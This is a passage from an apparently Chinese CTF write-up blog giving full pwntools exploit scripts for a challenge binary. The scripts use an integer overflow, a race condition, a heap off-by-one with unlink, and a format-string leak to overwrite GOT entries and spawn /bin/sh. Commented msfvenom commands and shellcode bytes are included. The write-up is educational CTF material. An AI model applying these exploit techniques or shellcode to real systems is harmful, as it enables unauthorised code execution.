class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-08-15 21:50:04</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils,os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"><span class="comment">#socat TCP4-LISTEN:10001,fork EXEC:./pwn1</span></div><div class="line">target = <span class="string">"./pwn"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">elf = ELF(target)</div><div class="line"><span class="comment"># lib = cdll.LoadLibrary('./libc64.so')</span></div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># 	p = process(target)</span></div><div class="line"><span class="comment"># 	p.recvuntil("input:")</span></div><div class="line"><span class="comment"># 	p.sendline(payload)</span></div><div class="line"><span class="comment"># 	p.recvuntil("input:")</span></div><div class="line"><span class="comment"># 	p.sendline(payload)</span></div><div class="line"><span class="comment"># 	return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># 	sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line">	</div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">	p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">	p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="comment"># west</span></div><div class="line">ru(<span class="string">"exit\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_house</span><span class="params">(soliders)</span>:</span></div><div class="line">	<span class="comment"># create a house</span></div><div class="line">	ru(<span class="string">"war\n"</span>)</div><div class="line">	sl(<span class="string">"1"</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(<span class="string">"n"</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(<span class="string">"\x00"</span>*<span class="number">0x10</span>+p32(<span class="number">0x7fffffff</span>))</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(<span class="string">"-2147483647"</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	<span class="comment">## Words</span></div><div class="line">	sd(<span class="string">"a"</span>*<span class="number">0x2e</span>)</div><div class="line"></div><div class="line">	<span class="comment">## soliders</span></div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(str(soliders))</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(<span class="string">"a"</span>*soliders)</div><div class="line"></div><div class="line">	<span class="comment">## ally</span></div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(<span class="string">"a"</span>*<span class="number">0x30</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_house2</span><span class="params">()</span>:</span></div><div class="line">	<span class="comment"># create a house</span></div><div class="line">	ru(<span class="string">"war\n"</span>)</div><div class="line">	sl(<span class="string">"1"</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(<span class="string">"n"</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(<span class="string">"\x00"</span>*<span class="number">0x10</span>+p32(<span class="number">0x7fffffff</span>))</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	<span class="comment"># int overflow</span></div><div class="line">	sl(<span class="string">"-2147483647"</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	<span class="comment">## Words</span></div><div class="line">	sd(<span class="string">"a"</span>*<span class="number">0x2e</span>)</div><div class="line"></div><div class="line">	<span class="comment">## soliders</span></div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(str(<span class="number">0x50</span>))</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(<span class="string">'a'</span>*<span class="number">0x38</span>+p64(elf.got[<span class="string">"atoi"</span>]))</div><div class="line"></div><div class="line">	<span class="comment">## ally</span></div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(<span class="string">"a"</span>*<span class="number">0x30</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_weapon</span><span class="params">(_id,weapon)</span>:</span></div><div class="line">	ru(<span class="string">"war\n"</span>)</div><div class="line">	sl(<span class="string">"2"</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(str(_id))</div><div class="line">	ru(<span class="string">'5000000\n'</span>)</div><div class="line">	sl(str(weapon))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_word</span><span class="params">()</span>:</span></div><div class="line">	ru(<span class="string">"war\n"</span>)</div><div class="line">	sl(<span class="string">"1024"</span>)</div><div class="line">	ru(<span class="string">"id\n"</span>)</div><div class="line">	sl(<span class="string">"0"</span>)</div><div class="line">	ru(<span class="string">" to Death?\n"</span>)</div><div class="line">	<span class="comment"># 0x10+0x14</span></div><div class="line">	payload = <span class="string">"Not today\x00"</span></div><div class="line">	payload = payload.ljust(<span class="number">0x30</span><span class="number">-0x24</span>,<span class="string">"a"</span>)</div><div class="line">	<span class="comment"># heap overlay </span></div><div class="line">	payload += p64(<span class="number">0</span>)+p64(<span class="number">0x1c0</span><span class="number">-0x30</span>+<span class="number">1</span>)</div><div class="line">	payload = payload.ljust(<span class="number">0x54</span>,<span class="string">"a"</span>)</div><div class="line">	<span class="comment"># fake chunck off by one</span></div><div class="line">	payload += chr(<span class="number">0x30</span>+<span class="number">0x10</span>)</div><div class="line">	sd(payload)</div><div class="line">	<span class="comment"># pass</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_war</span><span class="params">()</span>:</span></div><div class="line">	ru(<span class="string">"war\n"</span>)</div><div class="line">	sl(<span class="string">"4"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_vassal</span><span class="params">(addr)</span>:</span></div><div class="line">	ru(<span class="string">"war\n"</span>)</div><div class="line">	sl(<span class="string">"3"</span>)</div><div class="line">	ru(<span class="string">"id\n"</span>)</div><div class="line">	sl(<span class="string">"0"</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(str(<span class="number">0x50</span>))</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(p64(addr))</div><div class="line">create_house(<span class="number">0x50</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x401AE2\nc")</span></div><div class="line">create_house(<span class="number">0x40</span>)</div><div class="line">change_weapon(<span class="number">0</span>,<span class="number">4</span>)</div><div class="line">change_weapon(<span class="number">1</span>,<span class="number">5</span>)</div><div class="line">start_war()</div><div class="line"><span class="comment"># race condition</span></div><div class="line">change_word()</div><div class="line"><span class="keyword">import</span> time</div><div class="line">time.sleep(<span class="number">3</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x402301\nc")</span></div><div class="line"><span class="comment"># unsorted bin FIFO</span></div><div class="line">create_house2()</div><div class="line"><span class="comment"># fmt</span></div><div class="line">change_vassal(elf.symbols[<span class="string">"printf"</span>])</div><div class="line"></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"%7$s...."</span>+p64(elf.got[<span class="string">"printf"</span>]))</div><div class="line">printf_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line">offset = <span class="number">0x0000000000054b50</span> - <span class="number">0x0000000000044380</span></div><div class="line">system_addr = printf_addr-offset</div><div class="line"></div><div class="line"><span class="comment"># edit_addr</span></div><div class="line">sl(<span class="string">"%7$n...."</span>+p64(<span class="number">0x605130</span>))</div><div class="line"><span class="comment"># change_vassal(system_addr)</span></div><div class="line"><span class="comment"># gdb.attach(p,"b*0x402301\nc")</span></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"123"</span>)</div><div class="line">ru(<span class="string">"id\n"</span>)</div><div class="line">sd(<span class="string">"\n"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x7</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line"></div><div class="line">sl(p64(system_addr))</div><div class="line"></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h3 id="第二个漏洞"><a href="#第二个漏洞" class="headerlink" title="第二个漏洞"></a>第二个漏洞</h3><p>第二个漏洞出现在east模块，该模块下，存储slaves的长度被设计成为 chunk_size-8，而chunks_size由于其末三位是标记位，prev_size标记位于第8位，该标记位在前一个chunk在使用中时置1，故而当我们过呢关系slaves时，我们拥有一个字节的溢出，即off by one。我们可以利用这一个字节的溢出来修改下一个chunk的prev_size和其标记位来为实现overlay heap 和 unlink 攻击做铺垫（事实上这边只用到了unlink攻击，向前unlink），这边其实卡了我很久，一开始在想向前合并还是向后合并，后来尝试向后合并，但是 loyalty chunk的大小是0xe0+0x10 向后合并需要在下一个chunk构建fake_chunk_head，故而需要伪造 loyalty chunk_size 的字段值，使其满足寻址（找到下一个chunk）的逻辑，这个值是<code>0xe0+0x10+0x1+0x10=0x101</code>，很遗憾，需要溢出两个字节才能达到要求，而我们并没有溢出两个字节的条件。故而想到向前合并，在loyalty chunk的前一个chunk中构建fake_chunk_head，将loyalty chunk_size_prev_flag置0，构造loyalty prev_size，触发free loyalty chunk，我们便可以获得一次任意地址写的机会~~利用代码如下，其实直接看代码就可以，逻辑很清晰。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-08-17 00:53:09</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils,os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"><span class="comment">#socat TCP4-LISTEN:10001,fork EXEC:./pwn1</span></div><div class="line">target = <span class="string">"./pwn"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">elf = ELF(target)</div><div class="line"><span class="comment"># lib = cdll.LoadLibrary('./libc64.so')</span></div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># 	p = process(target)</span></div><div class="line"><span class="comment"># 	p.recvuntil("input:")</span></div><div class="line"><span class="comment"># 	p.sendline(payload)</span></div><div class="line"><span class="comment"># 	p.recvuntil("input:")</span></div><div class="line"><span class="comment"># 	p.sendline(payload)</span></div><div class="line"><span class="comment"># 	return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># 	sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line">	</div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">	p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">	p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="comment"># east</span></div><div class="line">ru(<span class="string">"exit\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Occupy</span><span class="params">(slaves,date)</span>:</span></div><div class="line">	ru(<span class="string">"Exit\n"</span>)</div><div class="line">	sl(<span class="string">"1"</span>)</div><div class="line">	ru(<span class="string">"choice:\n"</span>)</div><div class="line">	sl(<span class="string">"1"</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(str(slaves))</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(date)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_slaves</span><span class="params">(_id,date)</span>:</span></div><div class="line">	ru(<span class="string">"Exit\n"</span>)</div><div class="line">	sl(<span class="string">"2"</span>)</div><div class="line">	ru(<span class="string">"id\n"</span>)</div><div class="line">	sl(str(_id))</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(str(date))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ruin</span><span class="params">(_id,flag)</span>:</span></div><div class="line">	ru(<span class="string">"Exit\n"</span>)</div><div class="line">	sl(<span class="string">"3"</span>)</div><div class="line">	ru(<span class="string">"ruin\n"</span>)</div><div class="line">	sl(str(_id))</div><div class="line">	ru(<span class="string">"nate him?(y/n)"</span>)</div><div class="line">	sl(flag)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(_id)</span>:</span></div><div class="line">	ru(<span class="string">"Exit\n"</span>)</div><div class="line">	sl(<span class="string">"4"</span>)</div><div class="line">	ru(<span class="string">"id\n"</span>)</div><div class="line">	sl(str(_id))</div><div class="line"></div><div class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#0</span></div><div class="line">ru(<span class="string">"Khal"</span>)</div><div class="line">sl(<span class="string">"123"</span>)</div><div class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#1</span></div><div class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#2</span></div><div class="line"><span class="comment"># get fastbin#2 addr</span></div><div class="line">ruin(<span class="number">2</span>,<span class="string">"n"</span>)</div><div class="line">ruin(<span class="number">1</span>,<span class="string">"n"</span>)</div><div class="line">show(<span class="number">1</span>)</div><div class="line">ru(<span class="string">"salves: "</span>)</div><div class="line">fast_bin_addr  = u64(ru(<span class="string">"\n="</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">"fast_bin_addr#0="</span>+hex(fast_bin_addr)</div><div class="line"></div><div class="line"><span class="comment"># heap_base addr</span></div><div class="line"></div><div class="line">heap_addr = fast_bin_addr-(fast_bin_addr &amp; <span class="number">0xfff</span>)</div><div class="line">fast_bin_addr_ptr = heap_addr+<span class="number">0x10</span>+<span class="number">0x20</span></div><div class="line"></div><div class="line"><span class="comment"># rebuild </span></div><div class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#1</span></div><div class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#2</span></div><div class="line"></div><div class="line"><span class="comment"># overwrite small chunk size  unlink prev_fast_chunk</span></div><div class="line"></div><div class="line">fake_chunk_head = p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)+p64(fast_bin_addr_ptr<span class="number">-0x18</span>)+p64(fast_bin_addr_ptr<span class="number">-0x10</span>)</div><div class="line">payload = fake_chunk_head</div><div class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">"\x00"</span>)</div><div class="line">update_slaves(<span class="number">0</span>,payload+p64(<span class="number">0x40</span>)+chr(<span class="number">0xe0</span>+<span class="number">0x10</span>))</div><div class="line"><span class="comment"># unlink</span></div><div class="line">ruin(<span class="number">1</span>,<span class="string">"y"</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x40131D\nc")</span></div><div class="line"><span class="comment"># change atoi to printf</span></div><div class="line">update_slaves(<span class="number">0</span>,<span class="string">"a"</span>*<span class="number">0x18</span>+p64(elf.got[<span class="string">"atoi"</span>]))</div><div class="line">update_slaves(<span class="number">0</span>,p64(elf.symbols[<span class="string">"printf"</span>]))</div><div class="line"></div><div class="line"><span class="comment"># leak libc and calc system_addr</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sd(<span class="string">"%7$s...."</span>+p64(elf.got[<span class="string">"printf"</span>]))</div><div class="line">printf_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line">offset = <span class="number">0x0000000000054b50</span> - <span class="number">0x0000000000044380</span></div><div class="line">system_addr = printf_addr-offset</div><div class="line"></div><div class="line"><span class="comment"># change atoi to system</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x2</span>)</div><div class="line">ru(<span class="string">"id\n"</span>)</div><div class="line">sd(<span class="string">"\n"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(p64(system_addr))</div><div class="line"><span class="comment"># exec /bin/sh</span></div><div class="line">sd(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h3 id="第三个漏洞"><a href="#第三个漏洞" class="headerlink" title="第三个漏洞"></a>第三个漏洞</h3><p>第三个漏洞非常简单，字符串数组空间大小为0x20，然而却给它赋于了0x28的大小用户输入，导致其溢出覆盖了下一个指针，从而引发任意地址写的利用，我们可以利用任意地址写，将atoi改成printf来泄漏system地址，然后将atoi改成system实现任意代码执行,exp如下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-08-17 09:43:44</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils,os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div 